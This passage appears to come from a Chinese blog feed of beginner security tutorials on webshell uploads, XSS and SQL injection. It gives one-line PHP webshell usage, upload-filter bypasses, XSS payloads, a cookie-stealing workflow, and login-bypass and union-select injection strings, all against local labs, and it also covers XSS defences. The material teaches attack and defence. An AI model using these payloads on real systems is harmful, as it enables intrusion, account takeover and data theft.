title="WEBshell——网页木马文件"></a>WEBshell——网页木马文件</h3><p>最常见的利用文件上传漏洞的方法就是<strong>上传网站木马(webshell)文件</strong>。webshell根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制。</p><table><thead><tr><th align="center"></th><th align="center">一句话木马(小马)</th><th align="center">大马</th></tr></thead><tbody><tr><td align="center">功能</td><td align="center">功能简单，需要配合客户端使用</td><td align="center">功能完善，直接使用浏览器即可利用</td></tr><tr><td align="center">大小</td><td align="center">代码量通常在一行左右，不超过10行</td><td align="center">代码量通常较大</td></tr><tr><td align="center">隐蔽性</td><td align="center">强，容易通过变形隐藏特征，绕过过滤</td><td align="center">相对较弱，代码量大，容易被检测出来，通常需要通过加密等方式来隐藏特征。</td></tr></tbody></table><h3 id="一句话木马介绍"><a href="#一句话木马介绍" class="headerlink" title="一句话木马介绍"></a>一句话木马介绍</h3><p>（1）eval()函数将传入的内容作为php脚本执行；</p><p>（2）$_POST[‘v’]传入想要执行的代码(v为参数名，可任意更改)；</p><p>（3）v为传递数据的参数，只有使用正确的参数名提交代码才能够被执行，因此v也称为一句话木马的<strong>密码</strong></p><p><img src="https://i.loli.net/2021/01/23/k6UP4gvN18MjwzF.png" alt="image-20210123170942615"></p><h3 id="一句话木马利用思路"><a href="#一句话木马利用思路" class="headerlink" title="一句话木马利用思路"></a>一句话木马利用思路</h3><p>（1）手动构造数据包利用的思路是<strong>提交命令行、文件处理等函数代码实现控制服务器；</strong></p><p>（2）自动化工具利用的思路是<strong>使用中国菜刀或Cknife等工具实现对服务器的控制；</strong></p><p>（3）中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理。利用上传到服务器的一句话脚本，再通过一些添加配置就可以工作了。</p><p>（4）Cknife的功能与中国菜刀类似，不同的是<strong>Cknife是一开源产品。</strong></p><p><img src="https://i.loli.net/2021/01/23/EzlmfTJqHe6bnax.png" alt="image-20210123171654387"></p><h3 id="一句话木马利用方式"><a href="#一句话木马利用方式" class="headerlink" title="一句话木马利用方式"></a>一句话木马利用方式</h3><h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>（1）上传木马文件test.php</p><p><img src="https://i.loli.net/2021/01/23/lzqEdWa7Vp618Hu.png" alt="image-20210123172646352"></p><p>（2）浏览器连接，填写木马存放地址并访问：<a href="http://127.0.0.1/test.php">http://127.0.0.1/test.php</a></p><p>（3）利用hackbar工具手动构造命令并执行(注意：system()函数中命令包含多个单词，有空格则需要加双引号或单引号。)</p><p>如：<strong>v=system(ipconfig);</strong></p><p><strong>v=system(‘netstat -ano’);</strong></p><p><strong>v=system(‘ping <a href="http://www.baidu.com&/#39;">www.baidu.com&#39;</a>);</strong></p><p>（4）获取权限，命令执行结果可通过查看网页源代码更清晰直观显示。</p><p><img src="https://i.loli.net/2021/01/23/1pEeuUDczmYFvkj.png" alt="image-20210123173345789"></p><p><img src="https://i.loli.net/2021/01/23/m7g1hu5V6LGSkTz.png" alt="image-20210123173359330"></p><h4 id="自动"><a href="#自动" class="headerlink" title="自动"></a>自动</h4><p>（1）专用工具连接——Cknife</p><p><img src="https://i.loli.net/2021/01/23/kmF2NMnBcIorGWz.png" alt="image-20210123173602299"></p><p>（2）获取权限：右键URL可进行文件管理等操作，也可右键选择“模拟终端”，通过输入命令的方式控制服务器。</p><p><img src="https://i.loli.net/2021/01/23/7GwPkxsbnqVgZ6m.png" alt="image-20210123173824378"></p><p><img src="https://i.loli.net/2021/01/23/HRUzArytfD6WSXF.png" alt="image-20210123173853021"></p><h2 id="文件上传攻击"><a href="#文件上传攻击" class="headerlink" title="文件上传攻击"></a>文件上传攻击</h2><h3 id="文件上传漏洞测试思路"><a href="#文件上传漏洞测试思路" class="headerlink" title="文件上传漏洞测试思路"></a>文件上传漏洞测试思路</h3><p><img src="https://i.loli.net/2021/01/23/nNmCrzq1i9F5BKJ.png" alt="image-20210123182244608"></p><h3 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h3><p>（1）MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。</p><p>（2）是设定某种扩展名的文件<strong>用一种应用程序来打开的方式类型</strong>,当该扩展名文件被访问时，浏览器会自动使用指定应用程序来打开。</p><p>（3）多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><p>（4）标准的文件上传组件中会自动上传文件的MIME类型，但是由于MIME类型是从客户端传递的，修改也不影响文件正常运行，因此通过burp工具拦截和修改MIME类型可以轻易绕过此类检测。</p><table><thead><tr><th>常见的MIME类型</th></tr></thead><tbody><tr><td>xx.html超文本标记语言文本：text/html</td></tr><tr><td>xx.txt普通文本：text/plain</td></tr><tr><td>xx.pdf文档：application/pdf</td></tr><tr><td>xx.png图片：image/png</td></tr><tr><td>xx.jpg或xx.jpeg图片：image/jpeg</td></tr><tr><td>xx.gif图片：image/gif</td></tr><tr><td>xx.rtf文本：application/rtf</td></tr><tr><td>xx.asp：application/x-asap</td></tr></tbody></table><h3 id="文件上传漏洞利用"><a href="#文件上传漏洞利用" class="headerlink" title="文件上传漏洞利用"></a>文件上传漏洞利用</h3><h4 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h4><p>直接上传木马文件test.php，随后构造木马链接，访问木马并利用</p><p><img src="https://i.loli.net/2021/01/23/mGnxNlBq4pwo7aZ.png" alt="image-20210123183801625"></p><p><img src="https://i.loli.net/2021/01/23/ohA8xvTWGu9ecjV.png" alt="image-20210123183810063"></p><h4 id="JS校验-前端校验"><a href="#JS校验-前端校验" class="headerlink" title="JS校验(前端校验)"></a>JS校验(前端校验)</h4><p>（1）上传test1.php木马文件。无法成功上传，弹框要求以jpg、jpeg、JPG、JPEG这几种格式文件类型上传。</p><p><img src="https://i.loli.net/2021/01/23/xZFVUTIQf5ML91D.png" alt="image-20210123184202498"></p><p>（2）将木马文件test1.php后缀改为.jpg，再次上传文件，用burp抓包。在burp中修改文件后缀名为.php，点击Forward。</p><p><img src="https://i.loli.net/2021/01/23/7CABNjYmcWReHpa.png" alt="image-20210123184322559"></p><p>（3）上传成功后即可访问木马并利用</p><h4 id="MIME校验-后端校验"><a href="#MIME校验-后端校验" class="headerlink" title="MIME校验(后端校验)"></a>MIME校验(后端校验)</h4><p>（1）上传test2.php木马文件。无法成功上传，根据提示只能上传文件类型为JPEG或PNG的文件。</p><p><img src="https://i.loli.net/2021/01/23/gdKJ1EFzSulNMhy.png" alt="image-20210123184457521"></p><p>（2）将test2.php文件后缀名改为.jpeg,再次上传,用burp抓包。在burp中将木马文件的后缀名改为.php，点击Forward。或者不修改木马文件后缀名，而是将Content-Type的值改为image/jpeg也可成功上传木马文件。</p><p> <img src="https://i.loli.net/2021/01/23/LvBnV9khC5yuSX2.png" alt="image-20210123184614061"></p><p>（3）上传成功后即可访问木马并利用</p><h4 id="黑名单校验-后端校验"><a href="#黑名单校验-后端校验" class="headerlink" title="黑名单校验(后端校验)"></a>黑名单校验(后端校验)</h4><p>（1）上传test3.php木马文件。无法成功上传。</p><p><img src="https://i.loli.net/2021/01/23/7crZF8eUHpyOSxa.png" alt="image-20210123184828102"></p><p>（2）将test3.php后缀名大写PHP，再次上传。上传成功</p><p>（3）上传成功后即可访问木马并利用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS注入的原理与利用</title>
      <link href="2021/01/18/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/XSS%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2021/01/18/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/XSS%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="前端代码介绍"><a href="#前端代码介绍" class="headerlink" title="前端代码介绍"></a>前端代码介绍</h2><h3 id="前端开发三剑客-三种语言"><a href="#前端开发三剑客-三种语言" class="headerlink" title="前端开发三剑客(三种语言)"></a>前端开发三剑客(三种语言)</h3><p>（1）HTML：相当于一个文档，里面是要给用户的信息。使用他提供的一些标签，来把你想传递给用户的信息进行合理编排，使信息更好地传递给用户。(可以看成是一个人)</p><p>（2）CSS：相当于把这个文档进行修饰，美化实现更好的交互性，使用户接受信息更加舒服，自然。最好的修饰就是接近简洁，自然。(看成是一个人的外观)</p><p>（3）JavaScript：相当于更好地实现和用户的交互，使信息传递实现双向化。(看成是一个人的灵魂)</p><p><img src="https://i.loli.net/2021/01/18/Yv6WwENH8LikbGx.png" alt="image-20210118201537947"></p><h2 id="JavaScript详解"><a href="#JavaScript详解" class="headerlink" title="JavaScript详解"></a>JavaScript详解</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JavaScript是一种客户端脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML(标准通用标记语言下的一个应用)网页上使用，用来给HTML网页增加动态功能。</p><p>JavaScript基本特点：脚本编写语言，基于对象的语言，简单性，安全性，动态性，跨平台性</p><h3 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h3><p>JavaScript脚本都是写在script标签中。</p><pre><code class="javascript">&lt;script&gt;document.write(&quot;Hello World!&quot;)&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2021/01/18/z5SB7suPVNhQxUC.png" alt="image-20210118201339491"></p><h3 id="JavaScript常用脚本"><a href="#JavaScript常用脚本" class="headerlink" title="JavaScript常用脚本"></a>JavaScript常用脚本</h3><p>1.三种弹框函数</p><p>（1）alert()</p><pre><code class="javascript">&lt;script&gt;alert(666)&lt;/script&gt;</code></pre><p>（2）confirm()</p><p>（3）prompt()</p><p>2.跳转界面函数：window.location.href=</p><pre><code class="javascript">&lt;script&gt;window.location.href=&#39;https://www.baidu.com&#39;&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2021/01/18/YPbv6hNdnspqoI4.png" alt="image-20210118202224582"></p><p>3.读取cookie函数:document.cookie</p><pre><code class="javascript">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2021/01/18/2YQpLEbO8H63ITP.png" alt="image-20210118202759644"></p><p>4.引入js文件的属性。&lt;script&gt;可以通过”src”属性引入JavaScript文件</p><pre><code class="javascript">&lt;script src=&quot;1.js&quot;&gt;&lt;/script&gt;##1.js中：document.write(&quot;Hello World&quot;)</code></pre><h2 id="XSS注入漏洞的基本原理"><a href="#XSS注入漏洞的基本原理" class="headerlink" title="XSS注入漏洞的基本原理"></a>XSS注入漏洞的基本原理</h2><h3 id="XSS的简单介绍"><a href="#XSS的简单介绍" class="headerlink" title="XSS的简单介绍"></a>XSS的简单介绍</h3><p>（1）跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets,CSS)的缩写混淆，故将<strong>跨站脚本攻击缩写为XSS</strong>。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p>（2）XSS的危害：</p><ul><li>流量劫持</li><li>获取用户cookie信息，盗取账号</li><li>篡改、删除页面信息(钓鱼)</li><li>配合CSRF攻击(跨站请求伪造)，实施进一步的攻击</li></ul><h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p>通常将跨站脚本攻击分为三种类型：反射型XSS，存储型XSS，DOM型XSS</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>也被称为非持久型XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。例如网络钓鱼</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>也被称为持久型XSS，存储型XSS是<strong>最危险</strong>的一种跨站脚本漏洞，当攻击者提交一段XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。例如黑客的博客</p><p>例如：</p><p>（1）攻击者在留言板中提交一段XSS代码，服务端接收后并进行存储</p><p>（2）当管理员查看留言板时便触发了XSS代码，形成XSS跨站攻击</p><h2 id="XSS注入漏洞的利用"><a href="#XSS注入漏洞的利用" class="headerlink" title="XSS注入漏洞的利用"></a>XSS注入漏洞的利用</h2><h3 id="XSS注入思路"><a href="#XSS注入思路" class="headerlink" title="XSS注入思路"></a>XSS注入思路</h3><p><img src="https://i.loli.net/2021/01/18/zOeNdfRibYApMIn.png" alt="image-20210118211133079"></p><p>构造攻击代码的思路：</p><p>（1）判断位置</p><p>（2）闭合符号或标签</p><p>（3）放入基本的payload</p><h3 id="XSS注入位置"><a href="#XSS注入位置" class="headerlink" title="XSS注入位置"></a>XSS注入位置</h3><h4 id="script标签内"><a href="#script标签内" class="headerlink" title="script标签内"></a>script标签内</h4><p>无需闭合符号或标签直接插入JavaScript脚本</p><p><img src="https://i.loli.net/2021/01/18/7fntHMFEh3K25WP.png" alt="image-20210118212512886"></p><h4 id="标签内容位置"><a href="#标签内容位置" class="headerlink" title="标签内容位置"></a>标签内容位置</h4><p>需要闭合标签，构造新的script标签</p><p><img src="https://i.loli.net/2021/01/18/kh8rnDIFsiPCtZJ.png" alt="image-20210118212848130"></p><h4 id="标签的属性位置"><a href="#标签的属性位置" class="headerlink" title="标签的属性位置"></a>标签的属性位置</h4><p>闭合属性中的符号</p><p><img src="https://i.loli.net/2021/01/18/QFi4fley3wnhSap.png" alt="image-20210118212916577"></p><h3 id="基本的payload"><a href="#基本的payload" class="headerlink" title="基本的payload"></a>基本的payload</h3><ul><li>&lt;script&gt;alert(1)&lt;/script&gt;</li><li>&lt;body onload=alert(1)&gt;</li><li>&lt;input onclick=alert(1)&gt;</li><li>&lt;img src=1 onerror=alert(1)&gt;</li><li>&lt;a href=javascript:alert(1)&gt;</li></ul><h3 id="常见的攻击手段"><a href="#常见的攻击手段" class="headerlink" title="常见的攻击手段"></a>常见的攻击手段</h3><h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h4><p>攻击思路：首先针对目标用户访问的网站，寻找是否存在XSS漏洞；若存在，则构造攻击脚本发送给目标用户或者存放到主机；当用户再次访问该网站时就会触发攻击脚本，转而跳转到钓鱼网站，依此来获取目标用户的信息。</p><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><p>攻击思路：攻击者在服务器端(例如留言板)提交一段XSS代码，当用户(特别是管理员)登录网站查看提交的数据时，就会触发这段XSS代码，并会给予用户一个cookie。这个cookie会被攻击者劫持，攻击者可以利用这个cookie，以目标用户的身份登录到该网站。</p><h2 id="XSSER的基本使用"><a href="#XSSER的基本使用" class="headerlink" title="XSSER的基本使用"></a>XSSER的基本使用</h2><p>XSSER是XSS漏洞利用的框架，通过使用XSSER的payload盗取用户的Cookie，并可以配置是否keepsession，保持会话，也可用来做认证钓鱼等XSS攻击，还可以自行创建XSS攻击模板，进行快速的利用。</p><p><strong>使用步骤</strong></p><p>（1）登录XSSER后台，创建一个项目，填写项目信息</p><p>（2）配置要使用的XSS漏洞利用模块，生成漏洞利用代码</p><p>（3）拷贝生成的代码，将代码植入到存在漏洞的站点上</p><p>（4）当受害者浏览漏洞页面时便触发了漏洞利用的代码，受害者的cookie被发送到XSSER框架的站点上</p><p>（5）攻击者浏览项目，便可获得受害者的会话信息</p><p>（最后可使用类似cookie manager的插件添加cookie信息登录到受害者的账号）</p><h2 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h2><p>（1）XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本攻击的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</p><p>（2）修复和防范方法：</p><ul><li>三种类型的XSS漏洞都可以通过<strong>过滤或编码</strong>进行修复。</li><li>反射型XSS和存储型XSS可以在服务端对用户输入输出的内容进行过滤和编码操作，将关键字进行过滤处理，关键符号进行编码处理，如将所有on事件，script等关键字进行过滤，将所有&lt;,&gt;,”,’,=等特殊符号进行实体化编码或百分号编码便可以修复。</li><li>DOM型XSS如有在服务端进行交互，也可参考上述的方法进行修复，如未和服务端进行交互，可在客户端使用JavaScript等客户端脚本语言进行编码和过滤处理。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的原理与利用</title>
      <link href="2020/12/27/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2020/12/27/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入漏洞的基本原理"><a href="#SQL注入漏洞的基本原理" class="headerlink" title="SQL注入漏洞的基本原理"></a>SQL注入漏洞的基本原理</h2><p>（1）sql注入：将用户的输入当作指令/代码在数据库中使用。</p><p>（2）sql注入产生的原因：开发者没有采用必要的措施，去避免用户的输入改变原有数据库的语义，没有过滤” ‘，<br>特殊字符and，or，=，#等等导致了sql注入漏洞(基于数据库的漏洞)的产生。</p><h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>（1）绕过登录验证：使用万能密码登录网站后台等</p><p>（2）获取敏感数据：获取网站管理员账号、密码等</p><p>（3）文件系统操作：列目录，读取、写入文件等</p><p>（4）注册表操作：读取、写入、删除注册表等</p><p>（5）执行系统的命令：远程执行命令</p><h3 id="万能密码攻击原理"><a href="#万能密码攻击原理" class="headerlink" title="万能密码攻击原理"></a>万能密码攻击原理</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>（1）登录账号是admin 密码是123456，万能密码用户名是admin 密码是1’ or ‘1’=’1。万能密码利用了数据库需要闭合的原理，并且利用优先级顺序。</p><pre><code class="sql">select * from user where username=&#39;admin&#39; and passowrd=&#39;123456&#39;;select * from user where username=&#39;admin&#39; and password=&#39;1&#39; or &#39;1&#39;=&#39;1&#39;;</code></pre><p>（2）优先级：=大于and大于or。=做完后，先进行and运算，再进行or运算，而’1’=’1’恒成立，所以只要数据库中有记录，返回的结果集一定不为空，则登录必成功。</p><p><img src="https://i.loli.net/2020/12/28/kBavR57mSynNdZE.png" alt="image-20201228165324137"></p><h4 id="三种经典的万能密码"><a href="#三种经典的万能密码" class="headerlink" title="三种经典的万能密码"></a>三种经典的万能密码</h4><table><thead><tr><th align="center"></th><th align="center">用户名已知</th><th align="center">可用注释符号</th><th align="center">用户名未知</th></tr></thead><tbody><tr><td align="center">用户名</td><td align="center">admin/admin’ or ‘1’=’1</td><td align="center">‘or 1=1#</td><td align="center">1’ or 1=1#;</td></tr><tr><td align="center">密码</td><td align="center">1’ or ‘1’=’1/ 随便输</td><td align="center">随便输</td><td align="center">随便输</td></tr></tbody></table><p>PS:#和–后面的内容表示注释，在浏览器中–要写为–+</p><p><img src="https://i.loli.net/2020/12/28/gSj9O7IMUWTX4dD.png" alt="image-20201228171242966"></p><p><img src="https://i.loli.net/2020/12/28/ZYKHCSpAL9e8OVf.png" alt="image-20201228171257768"></p><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table><thead><tr><th align="center">基于注入点位置分类</th><th align="center">基于变量数据类型分类</th><th align="center">基于获取数据的方法分类</th></tr></thead><tbody><tr><td align="center">GET注入、POST注入、Cookie注入</td><td align="center">字符型注入、数字型注入</td><td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td></tr></tbody></table><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>（1）判断注入漏洞的依据：根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p><p><img src="https://i.loli.net/2020/12/28/5CYkZlWUs4TPdpA.png" alt="image-20201228175211367"></p><p>（2）基本的获取数据payload</p><table><thead><tr><th align="center">查询数据库版本</th><th align="center">查询数据库名称</th><th align="center">查询当前数据库用户名</th></tr></thead><tbody><tr><td align="center">select version();</td><td align="center">select database();</td><td align="center">select user();</td></tr></tbody></table><p><img src="https://i.loli.net/2020/12/28/uhTsUySvpEXQNxA.png" alt="image-20201228175814830"></p><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>（1）参数后加单引号，报错。报错注入</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1&#39;select first_name,last_name from users where user_id=1&#39;;</code></pre><p>（2）参数后加and 1 =1,访问正常。布尔型盲注</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1 and 1=1select first_name,last_name from users where user_id=1 and 1=1;</code></pre><p>（3）参数后加and 1=2，访问异常(如：无信息)。布尔型盲注</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1 and 1=2select first_name,last_name from users where user_id=1 and 1=2;</code></pre><p>（4）sleep()函数。时间盲注</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1 and sleep(5)select first_name,last_name from users where user_id=1 and sleep(5);</code></pre><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>（1）参数后加单引号，报错。报错注入</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;select user_id,user from users where last_name=&#39;admin&#39;&#39;;</code></pre><p>（2）参数后加’and ‘1’=’1,访问正常。布尔型盲注</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;and &#39;1&#39;=&#39;1select user_id,user from users where last_name=&#39;admin&#39;and &#39;1&#39;=&#39;1&#39;;</code></pre><p>（3）参数后加’and’1’=’2，访问异常。布尔型盲注</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;and&#39;1&#39;=&#39;2select user_id,user from users where last_name=&#39;admin&#39;and &#39;1&#39;=&#39;2&#39;;</code></pre><p>（4）参数后加’and sleep(3)–  3秒后打开。时间盲注</p><pre><code class="sql">http:/127.0.0.1/2/sql2.php?name=admin&#39;and/or sleep(3)--select user_id,user from users where last_name=&#39;admin&#39;and sleep(3)--&#39;;</code></pre><p><strong>PS：</strong></p><p><strong>字符型与数字型注入的主要区别是字符型注入需要通过单引号闭合来进行查询，有时还须通过注释屏蔽后续语句。</strong></p><p><strong>无论数字型还是字符型，满足上述条件时可基本判断存在注入漏洞，但不满足上述条件并不能证明漏洞不存在。</strong></p><h3 id="联合查询注入原理"><a href="#联合查询注入原理" class="headerlink" title="联合查询注入原理"></a>联合查询注入原理</h3><h4 id="SQL的union查询"><a href="#SQL的union查询" class="headerlink" title="SQL的union查询"></a>SQL的union查询</h4><p>（1）SQL中union操作符用于合并两个或多个select语句的结果集。union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型，结果会去掉重复的记录。</p><p>（2）当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。当web应用存在sql注入时，巧妙使用union查询可以进行数据的盗取。</p><p>（3）联合查询注入语句构造步骤：</p><p><img src="https://i.loli.net/2020/12/28/MQNeAl5zXHIYdtE.png" alt="image-20201228182925539"></p><h4 id="union-select语法"><a href="#union-select语法" class="headerlink" title="union select语法"></a>union select语法</h4><p>（1）使用union查询两张表中的数据记录，返回结果时会去掉重复记录。例如：</p><p><img src="https://i.loli.net/2020/12/28/gGpYviTeQXzbd2f.png" alt="image-20201228183401548"></p><pre><code class="sql">select aid,title from article union select bid,title from blog</code></pre><p><img src="https://i.loli.net/2020/12/28/oKbsvpuWBnHRUyQ.png" alt="image-20201228183520085"></p><p>（2）union查询结果说明：</p><p>重复记录是指查询中各个字段完全重复的记录，如上例，若title一样，但id号不一样则算作不同记录</p><p>在<strong>第一个</strong>select语句中被使用的字段名称也被用于结果的字段名称，如上例的aid</p><p>各select语句字段名称可以不同，但<strong>字段属性必须一致，且数目相同</strong></p><p>（3）union select语法用于合并两个或多个select语句的结果集。union内部的select语句必须拥有<strong>相同数量的列，因此判断原有查询语句的列数是构造SQL注入的第一步</strong></p><h4 id="判断原有查询语句的列数"><a href="#判断原有查询语句的列数" class="headerlink" title="判断原有查询语句的列数"></a>判断原有查询语句的列数</h4><p>（1）判断原有查询语句的列数通常基于布尔型盲注的思想来进行，通常使用order by语句来进行。</p><p>（2）<strong>ORDER BY语句用于对结果集进行排序</strong>，在select语句的末尾增加order by N 表示基于第N列进行排序；例如</p><pre><code class="sql">select Company,OrderNumber from Orders order by 1</code></pre><p><img src="https://i.loli.net/2020/12/28/HAqva4PjCiEwW3T.png" alt="image-20201228185004986"></p><p>（3）<strong>当N大于结果集的实际列数时，SQL语句会执行出错，此时SQL语句无法查询到数据，将导致页面显示异常；</strong>因此可以使用ORDER BY语句进行测试，通过逐一增加N的值，当页面显示异常时，可推测出结果集实际列数为N-1;</p><p>（4）通常查询语句的结果集并不会被全部输出到页面上，因此需要知道哪些列可以被输出，此时可以使用select语句的特殊用法来进行判断，在此之前要先保证原有的select语句查询结果为空。</p><p><strong>使原有查询结果为空的方法：</strong></p><p>a.数字型参数可以尝试将值设为0或负数或超大数。</p><p>b.字符型参数可以尝试将值设为空或超长字符串。</p><h4 id="判断数据输出位置"><a href="#判断数据输出位置" class="headerlink" title="判断数据输出位置"></a>判断数据输出位置</h4><p>（1）SELECT语句的特殊用法：当select关键字后跟随的字段名为数字时，结果集也将是对应的数字，如</p><p><img src="https://i.loli.net/2020/12/28/o4fQgRXVMNLWFOv.png" alt="image-20201228190302526"></p><p>（2）基于此用法，当知道原有查询语句的结果集列数时，就可以通过构造特殊的SQL联合查询语句得知查询结果集对应列在页面输出的位置，如：</p><p><img src="https://i.loli.net/2020/12/28/R4hBCy5YnQNK1op.png" alt="image-20201228190452066"></p><h4 id="构造数据提取语句"><a href="#构造数据提取语句" class="headerlink" title="构造数据提取语句"></a>构造数据提取语句</h4><p>在判断出输出位置后，将数据的输出位置替换为要查询的内容，即可通过联合查询的方式提取目标数据，被替换的位置可以是函数、字段名或另一个查询语句。</p><p><img src="https://i.loli.net/2020/12/28/GDgI2QenLcJzxmE.png" alt="image-20201228190845417"></p><p><img src="https://i.loli.net/2020/12/28/UKfi4sC7QVxWuad.png" alt="image-20201228192051553"></p><h4 id="构造显示的数据条目"><a href="#构造显示的数据条目" class="headerlink" title="构造显示的数据条目"></a>构造显示的数据条目</h4><p>（1）有时web应用并不会将SQL查询的所有结果集显示出来，如只显示结果集的第一条记录，这时就需要调整输出结果。在mysql中，可以使用limit语句实现。</p><p><strong>LIMIT子句可以被用于强制SELECT语句返回指定的记录数</strong></p><p>（2）LIMIT接收一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</p><p><strong>注意：初始记录行的偏移量是0而不是1</strong></p><p>（3）<strong>LIMIT语法：</strong></p><pre><code class="sql">select * from table LIMIT[offset,] rows | rows OFFSET offset</code></pre><p>（4）LIMIT例句：</p><pre><code class="sql">select * from table LIMIT 5       //检索前5个记录行select * from table LIMIT 5,10    //检索记录行6-15select * from table LIMIT 95，-1  //检索记录行96之后的所有数据</code></pre><p><img src="https://i.loli.net/2020/12/28/j1z5JDoWKX8QIYh.png" alt="image-20201228193220778"></p><h4 id="联合查询注入过程总结"><a href="#联合查询注入过程总结" class="headerlink" title="联合查询注入过程总结"></a>联合查询注入过程总结</h4><p>（1）判断原有查询语句的列数</p><pre><code class="sql">select company,ordermumber from orders order by 1</code></pre><p>（2）使原有查询语句的结果为空</p><pre><code>http://localhost/sqleasy/news.php?newsid=0</code></pre><p>（3）判断数据输出位置：</p><pre><code>http://localhost/sqleasy/news.php?newsid=0 union select 1,2,3,4</code></pre><p>（4）使用union语句拼接目标数据的查询语句</p><pre><code class="sql">select * from persons where id=1 union select username,password,3,4,5,6 from admin</code></pre><h3 id="报错注入的基本原理"><a href="#报错注入的基本原理" class="headerlink" title="报错注入的基本原理"></a>报错注入的基本原理</h3><p>如果web应用把sql注入的报错信息返回到客户端，那么可以通过构造特殊的错误语句并通过返回的错误信息盗取数据。</p><p><img src="https://i.loli.net/2020/12/28/QDLTgZqOvowe1A8.png" alt="image-20201228195018164"></p><h3 id="数据提取方式"><a href="#数据提取方式" class="headerlink" title="数据提取方式"></a>数据提取方式</h3><table><thead><tr><th align="center">联合查询</th><th align="center">报错注入</th><th align="center">布尔型盲注</th><th align="center">时间盲注</th></tr></thead><tbody><tr><td align="center">构造联合查询语句将目标数据直接查询出来并显示在页面上</td><td align="center">构造错误的SQL语句，并将目标数据在报错信息中直接显示</td><td 